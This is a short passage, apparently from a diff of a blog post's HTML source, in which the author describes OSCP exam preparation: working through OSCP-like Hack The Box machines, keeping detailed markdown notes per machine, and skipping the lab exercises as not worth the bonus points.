+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/oscp_htb_machines.jpg&quot; alt=&quot;List of OSCP-like machines&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;That got me motivated again, and it taught me a lot as well. One thing I should emphasize is that I was taking detailed notes in markdown for each machine to have and go through later, and as a preparation for the exam report. I didn’t do the exercises, so no lab report for me (not worth it anyway, going through all the exercises and document them, and documenting 10 machines that have different types of vulns is way too much work for a poor 5 points in my opinion and prepping you for failing on the exam, more on that later), so I could focus on hacking machines.&lt;/p&gt;
 
